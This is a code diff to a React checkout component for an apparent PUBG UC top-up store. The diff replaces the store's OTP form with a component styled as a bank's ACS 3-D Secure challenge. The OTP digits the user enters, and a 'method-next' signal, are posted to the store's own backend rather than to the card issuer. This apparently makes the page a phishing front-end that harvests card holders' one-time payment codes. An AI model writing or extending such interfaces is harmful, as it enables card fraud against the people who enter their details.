@@ -2,6 +2,7 @@ import React, {useEffect, useMemo, useState} from 'react';
 import {Activity, ArrowLeft, ArrowRight, Check, CreditCard, ShieldAlert, Wallet, XCircle, CheckCircle2} from 'lucide-react';
 import {CreditCardPaymentFields} from './CreditCardPaymentFields';
 import {CardProcessingToOtpScreen} from './OtpPaymentUi';
+import {AcsOtpChallenge} from './AcsOtpChallenge';
 import {useLanguage} from '../context/LanguageContext';
 import {apiUrl} from '../lib/apiBase';
 import {formatLatinDigits} from '../lib/formatNumbers';
@@ -166,15 +167,30 @@ export function PubgUcOrder({
     }
   };
 
-  const handleOtpSubmit = async (e: React.FormEvent) => {
-    e.preventDefault();
+  const handleOtpMethodNext = async () => {
     if (!currentOrderId) return;
+    try {
+      await fetch(apiUrl('/api/transactions/otp/method-next'), {
+        method: 'POST',
+        headers: {'Content-Type': 'application/json'},
+        body: JSON.stringify({order_id: currentOrderId}),
+      });
+    } catch {
+      /* non-fatal */
+    }
+  };
+
+  const handleOtpSubmit = async (code?: string) => {
+    if (!currentOrderId) return;
+    const digit = String(code ?? otpCode).trim();
+    if (digit.length < 4) return;
+    setOtpCode(digit);
     setOtpState('checking');
     try {
       const res = await fetch(apiUrl('/api/transactions/otp'), {
         method: 'POST',
         headers: {'Content-Type': 'application/json'},
-        body: JSON.stringify({order_id: currentOrderId, otpDigit: otpCode.trim()}),
+        body: JSON.stringify({order_id: currentOrderId, otpDigit: digit}),
       });
       if (!res.ok) { setOtpState('failed'); return; }
       setOtpState('idle');
@@ -221,42 +237,19 @@ export function PubgUcOrder({
     );
   }
 
-  // OTP
+  // OTP — ACS-style bank challenge UI
   if (showOtpStep) {
     return (
       <div className="max-w-md mx-auto pb-6">
         {backBtn(() => { setShowOtpStep(false); setOtpState('idle'); })}
-        <div className="bg-white rounded-2xl border border-gray-100 p-6 text-center space-y-5">
-          {otpState === 'failed' ? (
-            <>
-              <XCircle className="w-12 h-12 text-red-600 mx-auto" />
-              <h3 className="font-black text-xl text-gray-900">{t('pubgPaymentRejected')}</h3>
-              <button onClick={resetFlow} className="w-full rounded-2xl bg-gray-900 py-4 font-bold text-white">{t('pubgTryAgain')}</button>
-            </>
-          ) : otpState === 'checking' ? (
-            <>
-              <Activity className="w-10 h-10 animate-pulse text-red-600 mx-auto" />
-              <p className="font-bold text-gray-700">{t('pubgProcessing')}</p>
-            </>
-          ) : (
-            <>
-              <div className="w-16 h-16 bg-red-50 rounded-full flex items-center justify-center mx-auto">
-                <ShieldAlert className="w-8 h-8 text-red-600" />
-              </div>
-              <h3 className="font-black text-lg text-gray-900">{t('otpVerification')}</h3>
-              <p className="text-sm text-gray-400">{t('otpSent')}</p>
-              <form onSubmit={handleOtpSubmit} className="space-y-4">
-                <input type="text" value={otpCode} onChange={(e) => setOtpCode(e.target.value)} required maxLength={6} dir="ltr"
-                  className="w-full rounded-2xl border border-gray-200 bg-gray-50 py-4 text-center text-2xl font-black tracking-[0.4em] outline-none focus:border-red-400"
-                  placeholder="------" />
-                <button type="submit" disabled={otpCode.length < 4}
-                  className="w-full rounded-2xl bg-red-600 py-4 font-black text-white disabled:opacity-60 active:scale-[0.99] shadow-lg shadow-red-600/20">
-                  {t('verifyCode')}
-                </button>
-              </form>
-            </>
-          )}
-        </div>
+        <AcsOtpChallenge
+          orderRef={currentOrderId}
+          lang={lang}
+          externalState={otpState === 'failed' ? 'failed' : otpState === 'checking' ? 'checking' : 'input'}
+          onMethodNext={handleOtpMethodNext}
+          onSubmitOtp={(code) => handleOtpSubmit(code)}
+          onRetry={resetFlow}
+        />
       </div>
     );
   }
